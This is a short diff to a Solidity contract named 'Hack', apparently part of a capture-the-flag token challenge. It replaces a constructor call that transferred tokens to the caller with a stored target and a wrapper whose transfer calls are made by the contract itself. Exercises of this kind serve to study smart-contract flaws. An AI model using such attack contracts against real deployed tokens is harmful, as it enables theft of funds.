@@ -29,7 +29,18 @@ interface IToken {
 }
 
 contract Hack {
+
+  address target;
   constructor(address _target){
-    IToken(_target).transfer(msg.sender,21);
+    target = _target;
+    //IToken(_target).transfer(msg.sender,1);  
   }
+
+  function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+  function transfer(address _to, uint _value) public {
+    IToken(target).transfer(_to, _value); // important: msg.sender inside transfer function will be Hack contract
+  }
+   
 }
